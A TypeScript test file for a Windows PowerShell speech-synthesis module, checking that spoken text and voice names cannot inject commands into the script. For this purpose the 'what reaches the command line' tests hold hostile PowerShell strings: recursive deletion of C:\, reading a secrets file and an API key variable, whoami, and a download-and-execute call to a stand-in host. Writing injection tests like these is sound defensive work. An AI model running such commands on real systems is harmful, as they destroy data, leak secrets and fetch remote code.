// THE ZERO-KEY VOICE, ON THE PLATFORM MOST OWNERS ARE ON.
//
// Murage has exactly three ways to turn text into audio, and before this a
// Windows machine had none of them on its first day. ElevenLabs needs the
// person's own key. The Mac path is a Darwin binary. Flux Router has no
// synthesis endpoint at all, which is a fact about that service rather than a
// gap on our side (server/voice/flux-voice.ts says so at the top). So the
// first run could not speak one word to a Windows owner, which is most
// owners.
//
// The hardest part is not the speaking. It is that PowerShell takes its
// script as a STRING, and the thing being spoken will not always be a
// sentence the app wrote: a spoken reply is model output, and model output is
// downstream of the person's mail. In PowerShell a backtick is an escape, a
// dollar is an expansion, and a quote ends the string. So the tests that
// matter here are the ones about what reaches the command line.

import { describe, expect, it } from "vitest";

import { listWindowsVoices, parseVoiceList, synthesizeWindows, windowsVoicesAvailable } from "./windows-voices.ts";

/** Captures the argv instead of running anything. No PowerShell exists on the
 *  machine this suite runs on, which is the point: the seam is injectable so
 *  the Windows path is testable from a Mac. */
function recorder(stdout = "") {
  const calls: Array<{ file: string; args: string[] }> = [];
  return {
    calls,
    run: async (file: string, args: string[]) => {
      calls.push({ file, args });
      return { stdout };
    },
  };
}

describe("where the zero-key voice exists", () => {
  it("is Windows only, the same way the other one is Darwin only", () => {
    expect(windowsVoicesAvailable("win32")).toBe(true);
    expect(windowsVoicesAvailable("darwin")).toBe(false);
    expect(windowsVoicesAvailable("linux")).toBe(false);
  });
});

describe("what reaches the command line", () => {
  // THE ONE THAT MATTERS.
  //
  // Every one of these is a live PowerShell metacharacter. If the utterance
  // is ever concatenated into the script, this machine runs it.
  it("never puts the utterance in the script, whatever is in it", async () => {
    const hostile = [
      `'; Remove-Item C:\\ -Recurse -Force; '`,
      "$(Get-Content C:/secrets.txt)",
      "`n; whoami",
      '"; iex (New-Object Net.WebClient).DownloadString(\'http://x\'); "',
      "$env:FLUX_API_KEY",
    ].join(" ");

    const rec = recorder();
    await synthesizeWindows(hostile, undefined, rec.run).catch(() => undefined);
    const script = rec.calls[0].args.join(" ");

    // Not one fragment of it is in the script. It travels as base64 and is
    // decoded inside PowerShell, where it is data in a variable and never
    // parsed as a command.
    for (const fragment of ["Remove-Item", "whoami", "DownloadString", "FLUX_API_KEY", "Get-Content C:/secrets"]) {
      expect.soft(script, `"${fragment}" reached the command line`).not.toContain(fragment);
    }
    expect(script).toContain("FromBase64String");
    // ...and it really is the same text, so the guard did not eat the voice.
    const encoded = /FromBase64String\('([^']+)'\)/.exec(script)?.[1] ?? "";
    expect(Buffer.from(encoded, "base64").toString("utf8")).toBe(hostile);
  });

  it("escapes a voice name that closes the quote", async () => {
    const rec = recorder();
    // A voice name is chosen from a list, but the list comes off the machine
    // and a name is still a string somebody else wrote.
    const voice = "Ha'ck'; whoami; '";
    await synthesizeWindows("hello", voice, rec.run).catch(() => undefined);
    const script = rec.calls[0].args.join(" ");

    // NOT an assertion that "; whoami;" is absent. It is present, and it is
    // supposed to be: it survives as inert text inside a quoted string, the
    // same way a rude subject line survives into a brief. What matters is
    // that it can never STOP being text, and the only character that could
    // end that string is a single quote. So the assertion is that every one
    // of them was doubled, which is PowerShell's documented escape.
    expect(script).toContain(`'${voice.split("'").join("''")}'`);

    // The same thing said structurally: strip the escapes and no bare quote
    // is left, so the literal cannot be closed early.
    const literal = /SelectVoice\((.*?)\) \} catch/.exec(script)?.[1] ?? "";
    expect(literal.length).toBeGreaterThan(2);
    expect(literal.slice(1, -1).split("''").join("")).not.toContain("'");
  });

  it("runs without a profile, so a banner cannot become a voice list", async () => {
    const rec = recorder();
    await listWindowsVoices(rec.run);
    expect(rec.calls[0].file).toBe("powershell");
    expect(rec.calls[0].args).toContain("-NoProfile");
    // A prompt would hold the turn open until the timeout instead of failing.
    expect(rec.calls[0].args).toContain("-NonInteractive");
  });

  it("says nothing at all rather than spawning for an empty utterance", async () => {
    const rec = recorder();
    const audio = await synthesizeWindows("   ", undefined, rec.run);
    expect(rec.calls).toHaveLength(0);
    expect(audio.bytes.length).toBe(0);
  });
});

describe("reading the installed voices", () => {
  it("takes the name, the locale and the sample", () => {
    const voices = parseVoiceList(
      "Microsoft David Desktop\ten-US\tMicrosoft David Desktop - English (United States)\n"
      + "Microsoft Zira Desktop\ten-US\tMicrosoft Zira Desktop - English (United States)\n",
    );
    expect(voices).toHaveLength(2);
    expect(voices[0]).toMatchObject({ id: "Microsoft David Desktop", label: "Microsoft David Desktop" });
    expect(voices[0].description).toContain("en-US");
  });

  it("ignores a blank line rather than inventing a nameless voice", () => {
    expect(parseVoiceList("\n  \nMicrosoft David\ten-US\tA voice\n")).toHaveLength(1);
  });

  // Same contract as the Mac path: a machine that cannot answer has no
  // voices, rather than an error every call site has to handle.
  it("answers no voices when PowerShell is not there", async () => {
    const run = async () => {
      throw new Error("spawn powershell ENOENT");
    };
    await expect(listWindowsVoices(run)).resolves.toEqual([]);
  });
});
